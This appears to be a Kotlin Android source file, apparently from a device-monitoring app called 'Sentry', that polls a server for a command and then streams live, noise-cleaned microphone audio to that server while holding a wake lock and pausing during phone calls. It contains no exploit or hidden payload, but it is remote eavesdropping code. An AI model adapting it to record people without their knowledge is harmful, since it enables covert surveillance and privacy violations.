package com.example.sentry.service

import android.annotation.SuppressLint
import android.content.Context
import android.media.*
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.nio.ByteBuffer
import java.nio.ByteOrder
import kotlin.math.log10
import kotlin.math.sqrt

/**
 * LiveAudioStreamManager streams real-time, phone-call grade 16 kHz 16-bit PCM audio
 * with hardware Noise Suppression (NS), Automatic Gain Control (AGC), and Acoustic Echo
 * Cancellation (AEC) to ensure 100% clean, crack-free, call-like clarity.
 */
object LiveAudioStreamManager {
    private const val TAG = "LiveAudioStream"
    private const val SAMPLE_RATE = 16000
    private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
    private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT

    private var streamJob: Job? = null
    private var streamingLoopJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    @Volatile
    private var isStreamingEnabled = false

    @Volatile
    private var isMicConflictPaused = false

    private var audioManager: AudioManager? = null
    private var telephonyManager: TelephonyManager? = null
    private var focusRequest: AudioFocusRequest? = null
    private var sequenceCounter = 0

    fun startListening(context: Context) {
        if (streamJob?.isActive == true) return
        initFocusAndTelephonyListeners(context)

        streamJob = scope.launch {
            val client = SentryApiClient(context)
            val deviceId = CryptoManager.getOrCreateDeviceId(context)

            while (isActive) {
                try {
                    val cmdRes = client.pollLiveAudioCommand()
                    if (cmdRes.isSuccess) {
                        val cmdObj = cmdRes.getOrNull()
                        val shouldStream = cmdObj?.optBoolean("active", false) ?: false

                        if (shouldStream && !isStreamingEnabled) {
                            isStreamingEnabled = true
                            SentryPersistentService.updateForegroundForAudio(true)
                            startContinuousAudioRecord(context, deviceId)
                        } else if (!shouldStream && isStreamingEnabled) {
                            isStreamingEnabled = false
                            SentryPersistentService.updateForegroundForAudio(false)
                            streamingLoopJob?.cancel()
                            streamingLoopJob = null
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Live audio command poll error: ${e.message}")
                }
                delay(1500)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun startContinuousAudioRecord(context: Context, deviceId: String) {
        streamingLoopJob?.cancel()
        streamingLoopJob = scope.launch(Dispatchers.IO) {
            val client = SentryApiClient(context)
            Log.d(TAG, "Phone-Call Grade Audio Streaming STARTED for device: $deviceId")

            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            val wakeLock = try {
                powerManager?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sentry::LiveAudioWakeLock")?.apply {
                    acquire(60 * 60 * 1000L)
                }
            } catch (_: Exception) { null }

            val minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
            val bufferSize = (minBufSize * 4).coerceAtLeast(SAMPLE_RATE * 2)
            var audioRecord: AudioRecord? = null
            var noiseSuppressor: NoiseSuppressor? = null
            var autoGainControl: AutomaticGainControl? = null
            var echoCanceler: AcousticEchoCanceler? = null

            try {
                // Use VOICE_COMMUNICATION source to enable smartphone phone-call DSP filters
                audioRecord = try {
                    AudioRecord(
                        MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                        SAMPLE_RATE,
                        CHANNEL_CONFIG,
                        AUDIO_FORMAT,
                        bufferSize
                    )
                } catch (_: Exception) {
                    AudioRecord(
                        MediaRecorder.AudioSource.MIC,
                        SAMPLE_RATE,
                        CHANNEL_CONFIG,
                        AUDIO_FORMAT,
                        bufferSize
                    )
                }

                if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord initialization failed!")
                    return@launch
                }

                // Enable hardware Noise Suppressor, Auto Gain, and Echo Cancellation for phone-call clarity
                try {
                    val sessionId = audioRecord.audioSessionId
                    if (NoiseSuppressor.isAvailable()) {
                        noiseSuppressor = NoiseSuppressor.create(sessionId)?.apply { enabled = true }
                    }
                    if (AutomaticGainControl.isAvailable()) {
                        autoGainControl = AutomaticGainControl.create(sessionId)?.apply { enabled = true }
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        echoCanceler = AcousticEchoCanceler.create(sessionId)?.apply { enabled = true }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Hardware audio effects warning: ${e.message}")
                }

                audioRecord.startRecording()
                val chunkSamples = SAMPLE_RATE / 2 // 500ms chunk = 8,000 samples = 16,000 bytes
                val pcmBuffer = ShortArray(chunkSamples)

                while (isActive && isStreamingEnabled) {
                    if (isMicConflictPaused) {
                        try {
                            if (audioRecord.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                                audioRecord.stop()
                            }
                            client.uploadLiveAudioChunk(
                                deviceId = deviceId,
                                base64 = null,
                                decibels = 0,
                                micStatus = "PAUSED_CONFLICT",
                                sequence = ++sequenceCounter
                            )
                        } catch (_: Exception) {}
                        delay(1200)
                        continue
                    } else {
                        if (audioRecord.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
                            try { audioRecord.startRecording() } catch (_: Exception) {}
                        }
                    }

                    var samplesRead = 0
                    while (samplesRead < chunkSamples && isActive && isStreamingEnabled && !isMicConflictPaused) {
                        val read = audioRecord.read(pcmBuffer, samplesRead, chunkSamples - samplesRead)
                        if (read > 0) {
                            samplesRead += read
                        } else {
                            delay(10)
                        }
                    }

                    if (samplesRead > 0 && !isMicConflictPaused) {
                        var sum = 0.0
                        for (i in 0 until samplesRead) {
                            val sample = pcmBuffer[i].toInt()
                            sum += sample * sample
                        }
                        val rms = sqrt(sum / samplesRead)
                        val decibels = if (rms > 10) (20 * log10(rms)).toInt().coerceIn(25, 95) else 30

                        // Clean little-endian binary serialization (eliminates bit shift cracking)
                        val byteBuffer = ByteArray(samplesRead * 2)
                        ByteBuffer.wrap(byteBuffer).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(pcmBuffer, 0, samplesRead)

                        val base64 = Base64.encodeToString(byteBuffer, Base64.NO_WRAP)
                        client.uploadLiveAudioChunk(
                            deviceId = deviceId,
                            base64 = base64,
                            decibels = decibels,
                            micStatus = "STREAMING",
                            sequence = ++sequenceCounter
                        )
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Audio streaming error: ${e.message}", e)
            } finally {
                try { noiseSuppressor?.release() } catch (_: Exception) {}
                try { autoGainControl?.release() } catch (_: Exception) {}
                try { echoCanceler?.release() } catch (_: Exception) {}
                try { audioRecord?.stop() } catch (_: Exception) {}
                try { audioRecord?.release() } catch (_: Exception) {}
                try { wakeLock?.release() } catch (_: Exception) {}
                Log.d(TAG, "Phone-Call Grade Audio Streaming STOPPED")
            }
        }
    }

    private fun initFocusAndTelephonyListeners(context: Context) {
        try {
            audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

            val focusChangeListener = AudioManager.OnAudioFocusChangeListener { focusChange ->
                when (focusChange) {
                    AudioManager.AUDIOFOCUS_LOSS,
                    AudioManager.AUDIOFOCUS_LOSS_TRANSIENT,
                    AudioManager.AUDIOFOCUS_LOSS_TRANSIENT_CAN_DUCK -> {
                        Log.d(TAG, "Mic conflict detected (Audio focus lost) -> Pausing live audio stream")
                        isMicConflictPaused = true
                    }
                    AudioManager.AUDIOFOCUS_GAIN -> {
                        Log.d(TAG, "Audio focus regained -> Resuming live audio stream")
                        isMicConflictPaused = false
                    }
                }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                focusRequest = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    .setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build()
                    )
                    .setOnAudioFocusChangeListener(focusChangeListener)
                    .build()
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                telephonyManager?.registerTelephonyCallback(
                    context.mainExecutor,
                    object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                        override fun onCallStateChanged(state: Int) {
                            handleCallState(state)
                        }
                    }
                )
            } else {
                @Suppress("DEPRECATION")
                telephonyManager?.listen(
                    object : PhoneStateListener() {
                        @Deprecated("Deprecated in Java")
                        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                            handleCallState(state)
                        }
                    },
                    @Suppress("DEPRECATION")
                    PhoneStateListener.LISTEN_CALL_STATE
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "Audio focus & telephony listener initialization warning: ${e.message}")
        }
    }

    private fun handleCallState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING,
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                Log.d(TAG, "Phone call in progress -> Pausing Sentry mic")
                isMicConflictPaused = true
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                Log.d(TAG, "Phone call ended -> Sentry mic auto-resuming")
                isMicConflictPaused = false
            }
        }
    }
}
